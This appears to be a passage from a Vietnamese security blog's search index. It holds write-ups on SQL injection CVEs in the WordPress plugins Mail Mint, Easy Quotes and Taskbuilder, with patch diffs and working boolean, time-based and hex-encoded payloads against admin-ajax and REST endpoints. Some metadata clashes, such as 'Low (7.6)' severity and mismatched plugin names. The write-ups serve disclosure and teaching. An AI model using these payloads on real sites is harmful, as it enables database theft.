c√≥ m·ªôt ph·∫ßn t·ª≠, k·∫øt qu·∫£ c·ªßa implode() ch√≠nh l√† gi√° tr·ªã chu·ªói c·ªßa ph·∫ßn t·ª≠ ƒë√≥. Th·ª±c thi query, tr·∫£ v·ªÅ JSON ch·ª©a formatted_users + total_users Exploit Sau khi ph√¢n t√≠ch, ta th·∫•y tham s·ªë selectedCourses ƒë∆∞·ª£c x·ª≠ l√Ω qua nhi·ªÅu logic tr∆∞·ªõc khi truy·ªÅn v√†o query ch·ª©a SQLi, quan tr·ªçng ta v·∫´n ki·ªÉm so√°t ƒë∆∞·ª£c gi√° tr·ªã c·ªßa key value.\nPOST request qua BurpSuite:\nTa g·ª≠i request v·ªõi m·ªôt key duy nh·∫•t =\u0026gt; d·ªÖ d√†ng ki·ªÉm so√°t c√¢u query\nKhi ƒë√≥, c√¢u query tr·ªü th√†nh\nSELECT user_id FROM wp_usermeta WHERE meta_key IN (\u0026#39;course_abc\u0026#39;) OR 1=1 -- _access_from\u0026#39;) GROUP BY user_id LIMIT 5 OFFSET 0 ') tho√°t kh·ªèi IN 1=1 lu√¥n ƒë√∫ng =\u0026gt; tr·∫£ v·ªÅ t√¢t c·∫£ user_id trong wp_usermeta ƒêo·∫°n code c√≤n l·∫°i trong get_wp_users_by_learndash_with_limit_offset s·∫Ω truy v·∫•n meta th√¥ng tin c·ªßa t·∫•t c·∫£ user tr·∫£ v·ªÅ:\n$formatted_users = array_map( function ($user) { $user-\u0026gt;usermeta = array_map( function ($user_data) { return reset($user_data); }, get_user_meta($user-\u0026gt;ID) ); return $user; }, $contacts ); Conclusion L·ªó h·ªïng CVE-2025-58604 trong plugin WordPress Mail Mint tr∆∞·ªõc phi√™n b·∫£n 1.18.6 xu·∫•t ph√°t t·ª´ vi·ªác kh√¥ng s·ª≠ d·ª•ng c∆° ch·∫ø chu·∫©n b·ªã truy v·∫•n ($wpdb-\u0026gt;prepare) m√† truy·ªÅn tr·ª±c ti·∫øp d·ªØ li·ªáu t·ª´ ng∆∞·ªùi d√πng v√†o c√¢u l·ªánh SQL d·∫´n ƒë·∫øn l·ªó h·ªïng SQL Injection.\nB·∫£n v√° ch√≠nh th·ª©c ƒë√£ thay th·∫ø vi·ªác n·ªëi chu·ªói b·∫±ng c√°ch d√πng $wpdb-\u0026gt;prepare, gi√∫p ƒë·∫£m b·∫£o d·ªØ li·ªáu ƒë·∫ßu v√†o ƒë∆∞·ª£c ki·ªÉm so√°t v√† an to√†n h∆°n.\nKey takeaways:\nLu√¥n s·ª≠ d·ª•ng $wpdb-\u0026gt;prepare() khi l√†m vi·ªác v·ªõi database trong WordPress ƒë·ªÉ tr√°nh SQL Injection. Th∆∞·ªùng xuy√™n c·∫≠p nh·∫≠t plugin v√† ki·ªÉm tra b·∫£o m·∫≠t ƒë·ªÉ tr√°nh tr·ªü th√†nh m·ª•c ti√™u t·∫•n c√¥ng. References SQL Injection cheat sheet - PortSwigger\nWordPress Mail Mint Plugin \u0026lt;= 1.18.5 is vulnerable to SQL Injection\n","permalink":"//localhost:1313/vi/posts/2025-09-04-cve-2025-58604/","summary":"\u003ch2 id=\"introduction\"\u003eIntroduction\u003c/h2\u003e\n\u003cp\u003eL·ªó h·ªïng x·∫£y ra tr√™n plugin \u003cstrong\u003eMail Mint\u003c/strong\u003e c·ªßa WordPress tr∆∞·ªõc phi√™n b·∫£n \u003cstrong\u003e1.18.6\u003c/strong\u003e. ƒêi·ªÅu n√†y c√≥ th·ªÉ cho ph√©p k·∫ª t·∫•n c√¥ng tr·ª±c ti·∫øp t∆∞∆°ng t√°c v·ªõi c∆° s·ªü d·ªØ li·ªáu c·ªßa b·∫°n, bao g·ªìm kh√¥ng gi·ªõi h·∫°n ·ªü vi·ªác ƒë√°nh c·∫Øp th√¥ng tin.\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\u003cstrong\u003eCVE ID\u003c/strong\u003e: \u003ca href=\"https://www.cve.org/CVERecord?id=CVE-2025-58604\"\u003eCVE-2025-58604\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eProduct\u003c/strong\u003e: \u003ca href=\"https://wordpress.org/plugins/mail-mint/\"\u003eWordPress Mail Mint Plugin\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eVulnerability Type\u003c/strong\u003e: SQL Injection\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eAffected Versions\u003c/strong\u003e: \u0026lt;= 1.18.5\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eCVSS severity\u003c/strong\u003e: Low (7.6)\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eRequired Privilege\u003c/strong\u003e: Administrator\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"requirements\"\u003eRequirements\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://w41bu1.github.io/posts/wordpress-local-and-debugging/\"\u003e\u003cstrong\u003eLocal WordPress and Debugging\u003c/strong\u003e\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eMail Mint\u003c/strong\u003e:  v1.18.5(vul) v√† v1.18.6(fix)\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003ediff tool\u003c/strong\u003e: \u003cstrong\u003emeld\u003c/strong\u003e ho·∫∑c b·∫•t c·ª© tool n√†o c√≥ th·ªÉ compare ƒë·ªÉ th·∫•y ƒë∆∞·ª£c s·ª± kh√°c bi·ªát gi·ªØa 2 version\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"analysis\"\u003eAnalysis\u003c/h2\u003e\n\u003cp\u003e·ª®ng d·ª•ng ƒë√£ ƒë∆∞a tr·ª±c ti·∫øp d·ªØ li·ªáu t·ª´ ng∆∞·ªùi d√πng v√†o c√¢u query SQL m√† \u003cstrong\u003ekh√¥ng s·ª≠ d·ª•ng c√°c bi·ªán ph√°p b·∫£o v·ªá\u003c/strong\u003e khi·∫øn l·ªó h·ªïng SQL Injection x·∫£y ra.\u003c/p\u003e","title":"CVE-2025-58604"},{"content":"Introduction L·ªó h·ªïng x·∫£y ra tr√™n plugin Easy Quotes c·ªßa WordPress tr∆∞·ªõc phi√™n b·∫£n 1.2.3. ƒêi·ªÅu n√†y c√≥ th·ªÉ cho ph√©p k·∫ª t·∫•n c√¥ng tr·ª±c ti·∫øp t∆∞∆°ng t√°c v·ªõi c∆° s·ªü d·ªØ li·ªáu c·ªßa b·∫°n, bao g·ªìm kh√¥ng gi·ªõi h·∫°n ·ªü vi·ªác ƒë√°nh c·∫Øp th√¥ng tin.\nCVE ID: CVE-2025-26943 Product: WordPress Easy Quotes Plugin Vulnerability Type: SQL Injection Affected Versions: \u0026lt;= 1.2.2 CVSS severity: High (9.3) Required Privilege: Unauthenticated Requirements Local WordPress and Debugging Taskbuilder Plugin: v1.2.2(vul) v√† v1.2.3(fix) diff tool: meld ho·∫∑c b·∫•t c·ª© tool n√†o c√≥ th·ªÉ compare ƒë·ªÉ th·∫•y ƒë∆∞·ª£c s·ª± kh√°c bi·ªát gi·ªØa 2 version Analysis ·ª®ng d·ª•ng ƒë√£ ƒë∆∞a tr·ª±c ti·∫øp d·ªØ li·ªáu t·ª´ ng∆∞·ªùi d√πng v√†o c√¢u query SQL m√† kh√¥ng s·ª≠ d·ª•ng c√°c bi·ªán ph√°p b·∫£o v·ªá khi·∫øn l·ªó h·ªïng SQL Injection x·∫£y ra.\nPatch Diff D√πng diff tool b·∫•t k√¨ ƒë·ªÉ so s√°nh s·ª± kh√°c bi·ªát gi·ªØa b·∫£n l·ªói v√† b·∫£n v√°. C√≥ s·ª± kh√°c bi·ªát r√µ ·ªü file includes/quotes-data.php\nprivate static function get_family_data($family) { /** @var wpdb $wpdb */ global $wpdb; $tablename = $wpdb-\u0026gt;prefix . \u0026#39;easy-quotes-families\u0026#39;; return $wpdb-\u0026gt;get_row(\u0026#34;SELECT * FROM `\u0026#34;.$tablename.\u0026#34;` WHERE `family`=\u0026#39;\u0026#34;.$family.\u0026#34;\u0026#39;;\u0026#34;); } {: file=\u0026ldquo;includes/quotes-data.php v1.2.2\u0026rdquo; }\nB·∫£n v√° s·ª≠ d·ª•ng $wpdb-\u0026gt;prepare() thay v√¨ truy·ªÅn tr·ª±c ti·∫øp d·ªØ li·ªáu t·ª´ ng∆∞·ªùi d√πng v√†o c√¢u query.\nprivate static function get_family_data($family) { /** @var wpdb $wpdb */ global $wpdb; $tablename = $wpdb-\u0026gt;prefix . \u0026#39;easy-quotes-families\u0026#39;; $sql = $wpdb-\u0026gt;prepare( \u0026#34;SELECT * FROM %i WHERE `family` = %s\u0026#34;, $tablename, $family ); return $wpdb-\u0026gt;get_row($sql); } {: file=\u0026ldquo;includes/quotes-data.php v1.2.3\u0026rdquo; }\nC√≥ nhi·ªÅu h√†m c≈©ng ƒë∆∞·ª£c v√° b·∫±ng c√°ch tr√™n, nh∆∞: get_font_variant($family_id, $variant_id), get_font_variants($family), get_fonts($category = -1)\nTuy get_fonts_categories() ƒë√£ ƒë∆∞·ª£c v√° nh∆∞ng n√≥ kh√¥ng ch·ª©a d·ªØ li·ªáu t·ª´ ng∆∞·ªùi d√πng, n√™n kh√¥ng c·∫ßn quan t√¢m\npublic static function get_fonts_categories() { /** @var wpdb $wpdb */ global $wpdb; $tablename = $wpdb-\u0026gt;prefix . \u0026#39;easy-quotes-categories\u0026#39;; $sql = $wpdb-\u0026gt;prepare( \u0026#34;SELECT `category_id`, `category` FROM %i\u0026#34;, $tablename ); return $wpdb-\u0026gt;get_results($sql); } {: file=\u0026ldquo;includes/quotes-data.php v1.2.3\u0026rdquo; }\nHow it work? Ta khai th√°c l·ªói SQL Injection trong h√†m get_family_data($family), c√°c h√†m c√≤n l·∫°i khai th√°c t∆∞∆°ng t·ª±.\nget_family_data() l√† h√†m public trong class Quotes_Data\nclass Quotes_Data { function __construct() { add_filter(\u0026#39;posts_where\u0026#39;, array($this, \u0026#39;posts_where\u0026#39;), 10, 2); } // other function public static function get_font_variants($family) { $familyData = self::get_family_data($family); // other logic } public static function get_family($family, $variant_id) { $family_data = (array)self::get_family_data($family); // other logic } private static function get_family_data($family) { /** @var wpdb $wpdb */ global $wpdb; $tablename = $wpdb-\u0026gt;prefix . \u0026#39;easy-quotes-families\u0026#39;; return $wpdb-\u0026gt;get_row(\u0026#34;SELECT * FROM `\u0026#34;.$tablename.\u0026#34;` WHERE `family`=\u0026#39;\u0026#34;.$family.\u0026#34;\u0026#39;;\u0026#34;); } } {: file=\u0026ldquo;includes/quotes-data.php v1.2.2\u0026rdquo; }\nget_family_data() ƒë∆∞·ª£c g·ªçi trong 2 h√†m get_family() v√† get_font_variants() c·ªßa class Quotes_Data, ƒë·ªÉ bi·∫øt ch√∫ng s·ª≠ d·ª•ng ·ªü ƒë√¢u, ta t√¨m ki·∫øn v·ªõi t·ª´ kh√≥a get_family ho·∫∑c get_font_variants\nH√†m get_font_variants() ƒë∆∞·ª£c g·ªçi trong h√†m rest_route_callback_font_variants() c·ªßa class Quotes_Rest_Route\nclass Quotes_Rest_Route { function __construct() { add_action(\u0026#39;rest_api_init\u0026#39;, array($this, \u0026#39;rest_api_init\u0026#39;)); } /** * Register my REST route * * @return void */ function rest_api_init($wp_rest_server) { $args = [ \u0026#39;method\u0026#39; =\u0026gt; WP_REST_Server::READABLE, \u0026#39;callback\u0026#39; =\u0026gt; [$this, \u0026#39;rest_route_callback_quote\u0026#39;], \u0026#39;permission_callback\u0026#39; =\u0026gt; \u0026#39;__return_true\u0026#39; ]; register_rest_route(\u0026#39;layart/v1\u0026#39;, \u0026#39;/quote\u0026#39;, $args); // other logic $args[\u0026#39;callback\u0026#39;] = [$this, \u0026#39;rest_route_callback_font_variants\u0026#39;]; register_rest_route(\u0026#39;layart/v1\u0026#39;, \u0026#39;/font-variants\u0026#39;, $args); } // other function function rest_route_callback_font_variants(WP_REST_Request $request) { $family = $request-\u0026gt;get_param(\u0026#39;family\u0026#39;); $family = isset($family) ? $family : \u0026#34;Shadows Into Light\u0026#34;; $response = Quotes_Data::get_font_variants($family); return rest_ensure_response($response); } } H√†m kh·ªüi t·∫°o c·ªßa class Quotes_Rest_Route s·ª≠ d·ª•ng add_action(hook_name, callback) v·ªõi hook_name l√† rest_api_init ƒë·ªÉ ƒëƒÉng k√Ω c√°c endpoint t√πy ch·ªânh v·ªõi REST API System c·ªßa WordPress\nCallback rest_api_init s·ª≠ d·ª•ng register_rest_route nhi·ªÅu l·∫ßn ƒë·ªÉ t·∫°o c√°c endpoint d∆∞·ªõi namespace layart/v1\nrest_route_callback_font_variants l√† callback c·ªßa endpoint /wp-json/layart/v1/font-variants?family=family_name\n$family m·∫∑c ƒë·ªãnh l√† Shadows Into Light n·∫øu kh√¥ng ƒë∆∞·ª£c truy·ªÅn trong param.\nExploit Detect SQLi Ta th·ª≠ k·ªπ thu·∫≠t Boolean-based SQL Injection ƒë·ªÉ ki·ªÉm tra xem tham s·ªë family c√≥ d·ªÖ b·ªã ch√®n l·ªánh SQL hay kh√¥ng.\nTrue request: Khi ƒë√≥, c√¢u query th·ª±c thi s·∫Ω tr·ªü th√†nh:\nSELECT * FROM wp_easy-quotes-families WHERE family=\u0026#39;Roboto\u0026#39;+AND+\u0026#39;1\u0026#39;=\u0026#39;1\u0026#39;\u0026#34; ƒêi·ªÅu ki·ªán AND '1'='1' lu√¥n ƒë√∫ng =\u0026gt; query h·ª£p l·ªá, tr·∫£ v·ªÅ d·ªØ li·ªáu b√¨nh th∆∞·ªùng.\nFalse request: Khi ƒë√≥, c√¢u query th·ª±c thi s·∫Ω tr·ªü th√†nh:\nSELECT * FROM wp_easy-quotes-families WHERE family=\u0026#39;Roboto\u0026#39;+AND+\u0026#39;1\u0026#39;=\u0026#39;2\u0026#39;\u0026#34; ƒêi·ªÅu ki·ªán AND '1'='2' lu√¥n sai =\u0026gt; query kh√¥ng kh·ªõp =\u0026gt; tr·∫£ v·ªÅ [].\nGet First Letter of Database Name ƒêi·ªÅu ki·ªán ti√™n quy·∫øt ƒë·ªÉ dump ƒë∆∞·ª£c h·∫øt data l√† ph·∫£i dump ƒë∆∞·ª£c 1 k√Ω t·ª± b·∫•t k·ª≥ c·ªßa t√™n database, n·∫øu l·∫•y ƒë∆∞·ª£c th√¨ to√†n b·ªô data ƒë·ªÅu dump ƒë∆∞·ª£c.\nDatabase name ƒë∆∞·ª£c t√¥i ƒë·∫∑t t√™n l√† wordpress n√™n k√≠ t·ª± ƒë·∫ßu ti√™n l√† w {: .prompt-info }\nResponse tr·∫£ v·ªÅ d·ªØ li·ªáu b√¨nh th∆∞·ªùng =\u0026gt; k√≠ t·ª± ƒë·∫ßu ti√™n l√† w\nKhi ƒë√≥, c√¢u query th·ª±c thi s·∫Ω tr·ªü th√†nh:\nSELECT * FROM wp_easy-quotes-families WHERE family=\u0026#39;Roboto\u0026#39;+AND+SUBSTRING(DATABASE(),1,1)=\u0026#39;w\u0026#39;\u0026#34; Automatic Extraction D·ª±a tr√™n kƒ© thu·∫≠t boolean base ta vi·∫øt script ƒë·ªÉ t·ª± ƒë·ªông khai th√°c.\nScript Here\nConclusion L·ªó h·ªïng CVE-2025-26943 trong plugin WordPress Easy Quotes tr∆∞·ªõc phi√™n b·∫£n 1.2.3 xu·∫•t ph√°t t·ª´ vi·ªác kh√¥ng s·ª≠ d·ª•ng c∆° ch·∫ø chu·∫©n b·ªã truy v·∫•n ($wpdb-\u0026gt;prepare) m√† truy·ªÅn tr·ª±c ti·∫øp d·ªØ li·ªáu t·ª´ ng∆∞·ªùi d√πng v√†o c√¢u l·ªánh SQL d·∫´n ƒë·∫øn l·ªó h·ªïng SQL Injection.\nB·∫£n v√° ch√≠nh th·ª©c ƒë√£ thay th·∫ø vi·ªác n·ªëi chu·ªói b·∫±ng c√°ch d√πng $wpdb-\u0026gt;prepare, gi√∫p ƒë·∫£m b·∫£o d·ªØ li·ªáu ƒë·∫ßu v√†o ƒë∆∞·ª£c ki·ªÉm so√°t v√† an to√†n h∆°n.\nKey takeaways:\nLu√¥n s·ª≠ d·ª•ng $wpdb-\u0026gt;prepare() khi l√†m vi·ªác v·ªõi database trong WordPress ƒë·ªÉ tr√°nh SQL Injection. Th∆∞·ªùng xuy√™n c·∫≠p nh·∫≠t plugin v√† ki·ªÉm tra b·∫£o m·∫≠t ƒë·ªÉ tr√°nh tr·ªü th√†nh m·ª•c ti√™u t·∫•n c√¥ng. References SQL Injection cheat sheet - PortSwigger\nWordPress Easy Quotes Plugin \u0026lt;= 1.2.2 is vulnerable to SQL Injection\n","permalink":"//localhost:1313/vi/posts/2025-09-03-cve-2025-26943/","summary":"\u003ch2 id=\"introduction\"\u003eIntroduction\u003c/h2\u003e\n\u003cp\u003eL·ªó h·ªïng x·∫£y ra tr√™n plugin \u003cstrong\u003eEasy Quotes\u003c/strong\u003e c·ªßa WordPress tr∆∞·ªõc phi√™n b·∫£n \u003cstrong\u003e1.2.3\u003c/strong\u003e. ƒêi·ªÅu n√†y c√≥ th·ªÉ cho ph√©p k·∫ª t·∫•n c√¥ng tr·ª±c ti·∫øp t∆∞∆°ng t√°c v·ªõi c∆° s·ªü d·ªØ li·ªáu c·ªßa b·∫°n, bao g·ªìm kh√¥ng gi·ªõi h·∫°n ·ªü vi·ªác ƒë√°nh c·∫Øp th√¥ng tin.\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\u003cstrong\u003eCVE ID\u003c/strong\u003e: \u003ca href=\"https://www.cve.org/CVERecord?id=CVE-2025-26943\"\u003eCVE-2025-26943\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eProduct\u003c/strong\u003e: \u003ca href=\"https://wordpress.org/plugins/easy-quotes/#description\"\u003eWordPress Easy Quotes Plugin\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eVulnerability Type\u003c/strong\u003e: SQL Injection\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eAffected Versions\u003c/strong\u003e: \u0026lt;= 1.2.2\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eCVSS severity\u003c/strong\u003e: High (9.3)\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eRequired Privilege\u003c/strong\u003e: Unauthenticated\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"requirements\"\u003eRequirements\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://w41bu1.github.io/posts/wordpress-local-and-debugging/\"\u003e\u003cstrong\u003eLocal WordPress and Debugging\u003c/strong\u003e\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eTaskbuilder Plugin\u003c/strong\u003e:  v1.2.2(vul) v√† v1.2.3(fix)\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003ediff tool\u003c/strong\u003e: \u003cstrong\u003emeld\u003c/strong\u003e ho·∫∑c b·∫•t c·ª© tool n√†o c√≥ th·ªÉ compare ƒë·ªÉ th·∫•y ƒë∆∞·ª£c s·ª± kh√°c bi·ªát gi·ªØa 2 version\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"analysis\"\u003eAnalysis\u003c/h2\u003e\n\u003cp\u003e·ª®ng d·ª•ng ƒë√£ ƒë∆∞a tr·ª±c ti·∫øp d·ªØ li·ªáu t·ª´ ng∆∞·ªùi d√πng v√†o c√¢u query SQL m√† \u003cstrong\u003ekh√¥ng s·ª≠ d·ª•ng c√°c bi·ªán ph√°p b·∫£o v·ªá\u003c/strong\u003e khi·∫øn l·ªó h·ªïng SQL Injection x·∫£y ra.\u003c/p\u003e","title":"CVE-2025-26943"},{"content":"Introduction L·ªó h·ªïng x·∫£y ra tr√™n plugin Taskbuilder c·ªßa WordPress tr∆∞·ªõc phi√™n b·∫£n 4.0.2. ƒêi·ªÅu n√†y c√≥ th·ªÉ cho ph√©p k·∫ª t·∫•n c√¥ng tr·ª±c ti·∫øp t∆∞∆°ng t√°c v·ªõi c∆° s·ªü d·ªØ li·ªáu c·ªßa b·∫°n, bao g·ªìm kh√¥ng gi·ªõi h·∫°n ·ªü vi·ªác ƒë√°nh c·∫Øp th√¥ng tin.\nCVE ID: CVE-2025-39569 Product: WordPress Hostel Plugin Vulnerability Type: SQL Injection Affected Versions: \u0026lt; 4.0.2 CVSS severity: High (8.5) Required Privilege: Subscriber Requirements Local WordPress and Debugging Taskbuilder Plugin: v4.0.1(vul) v√† v4.0.2(fix) diff tool: meld ho·∫∑c b·∫•t c·ª© tool n√†o c√≥ th·ªÉ compare ƒë·ªÉ th·∫•y ƒë∆∞·ª£c s·ª± kh√°c bi·ªát gi·ªØa 2 version Analysis ·ª®ng d·ª•ng ƒë√£ x·ª≠ l√Ω d·ªØ li·ªáu ƒë·∫ßu v√†o tr∆∞·ªõc khi ƒë∆∞a v√†o c√¢u SQL. Tuy nhi√™n, trong qu√° tr√¨nh x√¢y d·ª±ng truy v·∫•n, gi√° tr·ªã n√†y ƒë∆∞·ª£c ch√®n tr·ª±c ti·∫øp m√† kh√¥ng ƒë∆∞·ª£c bao trong d·∫•u nh√°y ƒë∆°n '...'. ƒêi·ªÅu ƒë√≥ khi·∫øn k·∫ª t·∫•n c√¥ng c√≥ th·ªÉ ch√®n th√™m c√°c th√†nh ph·∫ßn c√∫ ph√°p SQL h·ª£p l·ªá (nh∆∞ OR, AND,...) v√†o truy v·∫•n, d·∫´n ƒë·∫øn l·ªó h·ªïng SQL Injection.\nPatch Diff D√πng diff tool b·∫•t k√¨ ƒë·ªÉ so s√°nh s·ª± kh√°c bi·ªát gi·ªØa b·∫£n l·ªói v√† b·∫£n v√°. C√≥ s·ª± kh√°c bi·ªát r√µ ·ªü file includes/admin/projects/get_users.php\nTrong phi√™n b·∫£n v4.0.1, bi·∫øn $proj_id sau khi escape ƒë∆∞·ª£c ƒë∆∞a th·∫≥ng v√†o c√¢u truy v·∫•n m√† kh√¥ng c√≥ d·∫•u nh√°y ƒë∆°n bao quanh:\n$proj_id = esc_sql($proj_id); $project = $wpdb-\u0026gt;get_row( \u0026#34;SELECT * FROM {$wpdb-\u0026gt;prefix}wppm_project where id = $proj_id\u0026#34; ); {: file=\u0026ldquo;includes/admin/projects/get_users.php v4.0.1\u0026rdquo; }\n·ªû b·∫£n v4.0.2, truy v·∫•n ƒë√£ ƒë∆∞·ª£c ƒëi·ªÅu ch·ªânh b·∫±ng c√°ch ƒë·∫∑t $proj_id trong d·∫•u nh√°y ƒë∆°n sau khi escape:\n$proj_id = esc_sql($proj_id); $project = $wpdb-\u0026gt;get_row( \u0026#34;SELECT * FROM {$wpdb-\u0026gt;prefix}wppm_project where id = \u0026#39;$proj_id\u0026#39;\u0026#34; ); {: file=\u0026ldquo;includes/admin/projects/get_users.php v4.0.2\u0026rdquo; }\nB·∫£n v√° n√†y ƒë·∫£m b·∫£o r·∫±ng gi√° tr·ªã $proj_id sau khi escape ƒë∆∞·ª£c coi l√† m·ªôt chu·ªói literal, kh√¥ng th·ªÉ tho√°t ra kh·ªèi d·∫•u nh√°y ƒë∆°n ƒë·ªÉ ch√®n th√™m c√∫ ph√°p SQL, qua ƒë√≥ ngƒÉn ch·∫∑n t·∫•n c√¥ng SQL Injection.\nHow it work? File architecture:\nC·∫•u tr√∫c chung c·ªßa file hi·ªán t·∫°i\n$proj_id = esc_sql($proj_id); $project = $wpdb-\u0026gt;get_row(\u0026#34;SELECT * FROM {$wpdb-\u0026gt;prefix}wppm_project WHERE id = $proj_id\u0026#34;); // B·∫Øt ƒë·∫ßu buffer ƒë·ªÉ t·∫°o n·ªôi dung ch√≠nh (body) c·ªßa modal ob_start(); // ... render HTML danh s√°ch users $body = ob_get_clean(); // B·∫Øt ƒë·∫ßu buffer ƒë·ªÉ t·∫°o ph·∫ßn footer c·ªßa modal ob_start(); // ... render HTML c√°c n√∫t thao t√°c (Close, Save) $footer = ob_get_clean(); // Tr·∫£ d·ªØ li·ªáu JSON ƒë·ªÉ frontend hi·ªÉn th·ªã modal echo json_encode([ \u0026#39;body\u0026#39; =\u0026gt; $body, \u0026#39;footer\u0026#39; =\u0026gt; $footer, ]); {: file=\u0026ldquo;includes/admin/projects/get_users.php v4.0.1\u0026rdquo; }\n$proj_id / $project: L·∫•y d·ªØ li·ªáu project t·ª´ database. ob_start() / ob_get_clean(): Ghi HTML ra buffer thay v√¨ xu·∫•t tr·ª±c ti·∫øp, gi√∫p gom n·ªôi dung v√†o bi·∫øn. $body / $footer: Ch·ª©a n·ªôi dung HTML ƒë·ªông c·ªßa modal. json_encode(): Tr·∫£ JSON cho client, c√≥ kh·∫£ nƒÉng ƒë∆∞·ª£c s·ª≠ d·ª•ng trong Ajax ƒë·ªÉ hi·ªÉn th·ªã modal m√† kh√¥ng c·∫ßn refresh trang. File n·∫±m trong th∆∞ m·ª•c includes cho th·∫•y r·∫±ng n√≥ s·∫Ω ƒë∆∞·ª£c g·ªçi ·ªü 1 ch·ª©c nƒÉng n√†o ƒë√≥ ·ªü n∆°i kh√°c. ƒê·ªÉ bi·∫øt ch·ª©c nƒÉng n√†o s·ª≠ d·ª•ng n√≥, ta t√¨m ki·∫øm v·ªõi t·ª´ kh√≥a get_users.php trong th∆∞ m·ª•c ch·ª©a plugin.\nüëâ N√≥ ƒë∆∞·ª£c include trong h√†m wppm_get_users() c·ªßa class WPPM_Admin trong file class-wppm-admin.php. wppm_get_users() l√† callback c·ªßa action hook trong WordPress.\nWPPM_Admin construct:\nfinal class WPPM_Admin { // constructor public function __construct() { // other action add_action( \u0026#39;wp_ajax_wppm_get_users\u0026#39;,array($this,\u0026#39;wppm_get_users\u0026#39;)); // array($this,\u0026#39;wppm_get_users\u0026#39;)) = $this::wppm_get_users() // other action } } {: file=\u0026ldquo;includes/class-wppm-admin.php v4.0.1\u0026rdquo; }\nadd_action() l√† m·ªôt Plugin API c·ªßa WordPress, cho ph√©p g·∫Øn m·ªôt callback v√†o m·ªôt action hook. wp_ajax_wppm_get_users l√† t√™n hook Ajax, v·ªõi quy t·∫Øc ƒë·∫∑t t√™n: wp_ajax_{action} =\u0026gt; X·ª≠ l√Ω Ajax khi user ƒë√£ ƒëƒÉng nh·∫≠p. wp_ajax_nopriv_{action} =\u0026gt; X·ª≠ l√Ω Ajax khi user ch∆∞a ƒëƒÉng nh·∫≠p. ·ªû ƒë√¢y, action = wppm_get_users. Nghƒ©a l√† n·∫øu trong Ajax request b·∫°n g·ª≠i action=wppm_get_users t·ªõi admin-ajax.php, th√¨ WordPress s·∫Ω t√¨m callback t∆∞∆°ng ·ª©ng ƒë·ªÉ x·ª≠ l√Ω, ·ªü ƒë√¢y l√† wppm_get_users(). üëâ Ta ƒë√£ bi·∫øt ƒë∆∞·ª£c action = wppm_get_users, ki·ªÉm tra xem Ajax n√†o s·ª≠ d·ª•ng action n√†y b·∫±ng c√°ch t√¨m t·ª´ kh√≥a wppm_get_users tr√™n c√°c file .js trong th∆∞ m·ª•c ch·ª©a plugin.\nAction wppm_get_users l√† ph·∫ßn data trong request POST c·ªßa h√†m wppm_get_users()\nH√†m wppm_get_users() s·∫Ω ƒë∆∞·ª£c ƒë·∫∑t trong HTML attribute c·ªßa ch·ª©c nƒÉng project\nT·∫°o project m·ªõi Truy c·∫≠p v√†o project ƒë√≥ Inspect code v√† t√¨m h√†m wppm_get_users s·∫Ω ƒë∆∞·ª£c ƒë·∫∑t ·ªü ƒë√¢u, h√†nh ƒë·ªông n√†o s·∫Ω g·ªçi n√≥ üëâ Khi click v√†o icon b√™n c·∫°nh Users ajax s·∫Ω ho·∫°t ƒë·ªông, g·ª≠i request ƒë·∫øn server, l·∫•y danh s√°ch c√°c user tham gia project v√† m√£ HTML hi·ªÉn th·ªã n√≥.\nExploit Detect SQLi B·∫Øt request b·∫±ng BurpSuite, g·ª≠i request v·ªõi SQLi payload time base\nPOST /wp-admin/admin-ajax.php HTTP/1.1 ... action=wppm_get_users\u0026amp;proj_id=(SELECT+SLEEP(1)) Th·ªùi gian ph·∫£n h·ªìi b·ªã delay =\u0026gt; SQL Injection th√†nh c√¥ng.\nGet First Letter of Database Name ƒêi·ªÅu ki·ªán ti√™n quy·∫øt ƒë·ªÉ dump ƒë∆∞·ª£c h·∫øt data l√† ph·∫£i dump ƒë∆∞·ª£c 1 k√Ω t·ª± b·∫•t k·ª≥ c·ªßa t√™n database, n·∫øu l·∫•y ƒë∆∞·ª£c th√¨ to√†n b·ªô data ƒë·ªÅu dump ƒë∆∞·ª£c.\nG·ª≠i request v·ªõi SQLi payload boolean base v√≥i proj_id ƒë√∫ng:\nPOST /wp-admin/admin-ajax.php HTTP/1.1 ... action=wppm_get_users\u0026amp;proj_id=(SELECT+IF(SUBSTRING(DATABASE(),1,1)=0x77,4,999)) Database name ƒë∆∞·ª£c t√¥i ƒë·∫∑t t√™n l√† wordpress n√™n k√≠ t·ª± ƒë·∫ßu ti√™n l√† w t∆∞∆°ng ·ª©ng v·ªõi m√£ HEX l√† 0x77 {: .prompt-info }\nS·ª≠ d·ª•ng SUBSTRING(STRING,1,1) ƒë·ªÉ l·∫•y k√≠ t·ª± ƒë·∫ßu ti√™n c·ªßa chu·ªói\n·ªû ƒë√¢y, $proj_id b·∫±ng 4 v√¨ SUBSTRING('wordpress',1,1)=0x77 l√† ƒë√∫ng n√™n SELECT l·∫•y gi√° tr·ªã ƒë√∫ng trong IF(condition, value if true, value if false), 4 l√† gi√° tr·ªã c√≥ th·ª±c trong database, n√™n response tr·∫£ v·ªÅ ch·ª©a danh s√°ch ng∆∞·ªùi tham gia d·ª± √°n\nS·ª≠ d·ª•ng HEX technique ƒë·ªÉ bypass h√†m esc_sql() 